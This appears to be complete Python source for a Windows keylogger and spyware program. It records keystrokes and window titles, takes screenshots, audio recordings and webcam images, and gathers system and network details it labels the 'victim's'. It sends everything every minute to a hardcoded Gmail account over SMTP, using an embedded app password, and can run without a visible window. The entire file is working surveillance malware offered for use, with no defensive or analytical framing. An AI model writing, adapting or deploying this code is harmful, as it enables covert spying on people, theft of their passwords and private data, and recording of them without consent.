import smtplib
import ssl
import time
import win32gui
from datetime import datetime
from pynput import keyboard
import requests
import getmac
import subprocess
from PIL import ImageGrab
import sounddevice as sd
import soundfile as sf
import os
import tempfile
import threading
import psutil
import platform
import cv2

# Define constants
log_file_path = "Keylog.txt"
delay = 60  # Delay in seconds before sending email

# Initialize variables
logged_data = []
old_app = ""
stop_key = keyboard.Key.f12
stop_flag = False

# Function to handle key press event
def on_press(key):
    global old_app, logged_data
    if key == stop_key:
        stop_keylogger()
        return False

    try:
        # Get the name of the current active window
        new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if new_app == 'Cortana':  # Cortana is a virtual assistant developed by Microsoft
            new_app = 'Windows Start Menu'

        # Log the window name if it has changed
        if new_app != old_app and new_app != '':
            logged_data.append(f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}] ~ {new_app}\n')  # Log date and time
            old_app = new_app
    except Exception as e:
        print(f"Error: {e}")

    try:
        # Dictionary mapping special keys to their representations
        substitution = {
            keyboard.Key.enter: '[ENTER]\n', keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.space: ' ', keyboard.Key.alt_l: '[ALT]',
            keyboard.Key.tab: '[TAB]', keyboard.Key.delete: '[DEL]',
            keyboard.Key.ctrl_l: '[CTRL]', keyboard.Key.left: '[LEFT ARROW]',
            keyboard.Key.right: '[RIGHT ARROW]', keyboard.Key.shift: '[SHIFT]',
            keyboard.Key.caps_lock: '[CAPS LK]', keyboard.Key.cmd: '[WINDOWS KEY]',
            keyboard.Key.print_screen: '[PRNT SCR]'
        }

        # Log the pressed key
        if key in substitution:
            logged_data.append(substitution[key])
        else:
            logged_data.append(key.char)

    except AttributeError:
        logged_data.append(str(key))

# Function to handle key release event
def on_release(key):
    pass

# Function to save data to a log file
def save_to_file(data):
    try:
        with open(log_file_path, "a", encoding="utf-8") as file:
            file.write(data)
    except Exception as e:
        print(f"Error saving to file: {e}")

def hide_cmd(script_path):
    try:
        subprocess.Popen(["pythonw", script_path], creationflags=subprocess.CREATE_NO_WINDOW)
        print("Command Prompt window hidden successfully.")
    except Exception as e:
        print(f"Error: {e}")

# Function to take a screenshot
def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
    screenshot.save(screenshot_path)
    return screenshot_path

# Function to record audio
def record_audio(duration=10):
    audio_file_path = os.path.join(tempfile.gettempdir(), "audio.wav")
    fs = 44100  # Sample rate
    seconds = duration  # Duration of recording
    print("Recording audio...")
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished
    sf.write(audio_file_path, myrecording, fs)
    print("Audio recorded")
    return audio_file_path

# Function to take a webcam screenshot
def take_webcam_screenshot():
    webcam = cv2.VideoCapture(0)
    ret, frame = webcam.read()
    webcam_path = os.path.join(tempfile.gettempdir(), "webcam.png")
    if ret:
        cv2.imwrite(webcam_path, frame)
    webcam.release()
    cv2.destroyAllWindows()
    return webcam_path


# Function to get system information
def get_system_info():
    try:
        partitions = psutil.disk_partitions()
        disk_usage = {
            p.device: {
                "Used": f'{psutil.disk_usage(p.mountpoint).used / (1024.0 ** 3):.2f} GB',
                "Total": f'{psutil.disk_usage(p.mountpoint).total / (1024.0 ** 3):.2f} GB',
                "Free": f'{psutil.disk_usage(p.mountpoint).free / (1024.0 ** 3):.2f} GB'
            }
            for p in partitions
        }

        battery = psutil.sensors_battery()
        battery_percent = battery.percent if battery else 'N/A'

        system_info = {
            "Platform": platform.system(),
            "Platform Release": platform.release(),
            "Platform Version": platform.version(),
            "Architecture": platform.machine(),
            "Hostname": platform.node(),
            "Processor": platform.processor(),
            "RAM": f'{psutil.virtual_memory().total / (1024.0 ** 3):.2f} GB',
            "Disk Usage": disk_usage,
            "Battery Percentage": f'{battery_percent} %'
        }
        return system_info
    except Exception as e:
        print(f"Error getting system information: {e}")
        return None

# Function to send email containing logged data, screenshot, audio, webcam screenshot, and system information
def email(logged_data, ip_address, mac_address, isp, location, screenshot_path, audio_file_path, webcam_path, system_info):
    message = f"Victim's IP Address: {ip_address}\n"
    message += f"Victim's MAC Address: {mac_address}\n"
    message += f"ISP: {isp}\n"
    message += f"Location: {location}\n\n"
    message += f"System Info: {system_info}\n\n"
    message += 'Logged Data:\n'
    message += ''.join(logged_data)

    # Include victim's information in the email subject
    subject = f"Keylogger Data - IP: {ip_address}, MAC: {mac_address}, ISP: {isp}, Location: {location}"

    send_email(subject, message, screenshot_path, audio_file_path, webcam_path)  # Send email


# Function to send email
def send_email(subject, message, screenshot_path, audio_file_path, webcam_path):
    smtp_server = "smtp.gmail.com"
    port = 465
    sender_email = "cygnusfederation@gmail.com"
    password = "masg oiel qmdq iwhg"
    receiver_email = "cygnusfederation@gmail.com"

    context = ssl.create_default_context()

    try:
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)

            # Create email message
            email_message = f"Subject: {subject}\n\n{message}"

            # Read screenshot, audio, and webcam files
            with open(screenshot_path, "rb") as screenshot_file:
                screenshot_data = screenshot_file.read()
            with open(audio_file_path, "rb") as audio_file:
                audio_data = audio_file.read()
            with open(webcam_path, "rb") as webcam_file:
                webcam_data = webcam_file.read()

            # Create email with attachments
            from email.message import EmailMessage
            msg = EmailMessage()
            msg['Subject'] = subject
            msg['From'] = sender_email
            msg['To'] = receiver_email
            msg.set_content(message)
            msg.add_attachment(screenshot_data, maintype='image', subtype='png', filename='screenshot.png')
            msg.add_attachment(audio_data, maintype='audio', subtype='wav', filename='audio.wav')
            msg.add_attachment(webcam_data, maintype='image', subtype='png', filename='webcam.png')

            # Send email
            server.send_message(msg)
            print("Email sent successfully")
    except Exception as e:
        print(f"Error sending email: {e}")

# Function to stop the keylogger
def stop_keylogger():
    global stop_flag
    stop_flag = True

# Function to create or clear the log file
def create_or_clear_log_file():
    with open(log_file_path, "w"):
        pass

# Function to fetch victim's information (IP, MAC, ISP, location)
def get_victim_info():
    try:
        response = requests.get('https://ipinfo.io') 
        if response.status_code == 200:
            data = response.json()
            ip_address = data.get('ip', 'Unknown')
            location = data.get('loc', 'Unknown')
            isp = data.get('org', 'Unknown')

            # Fetch victim's MAC address using getmac library
            mac_address = getmac.get_mac_address()

            print(f"Victim's IP Address: {ip_address}")
            print(f"Victim's MAC Address: {mac_address}")
            print(f"ISP: {isp}")
            print(f"Location: {location}")

            return ip_address, mac_address, isp, location
        else:
            print(f"Failed to fetch IP address: {response.status_code}")
            return None, None, None, None
    except Exception as e:
        print(f"Error getting victim's information: {e}")
        return None, None, None, None

# clear the log file
create_or_clear_log_file()

# Start key press listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

def periodic_tasks():
    while not stop_flag:
        time.sleep(delay)
        if logged_data:
            ip_address, mac_address, isp, location = get_victim_info()
            if ip_address:
                screenshot_path = take_screenshot()
                audio_file_path = record_audio()
                webcam_path = take_webcam_screenshot()
                system_info = get_system_info() 
                email(logged_data, ip_address, mac_address, isp, location, screenshot_path, audio_file_path, webcam_path, system_info)  # Pass system_info to email function
                email_message = f"\nVictim's IP Address: {ip_address}\n"
                email_message += f"Victim's MAC Address: {mac_address}\n"
                email_message += f"ISP: {isp}\n"
                email_message += f"Location: {location}\n\n"
                email_message += ''.join(logged_data)
                for data in logged_data:
                    save_to_file(data)
                save_to_file(email_message)
                logged_data.clear()

try:
    task_thread = threading.Thread(target=periodic_tasks)
    task_thread.start()
    task_thread.join()
except KeyboardInterrupt:
    stop_keylogger()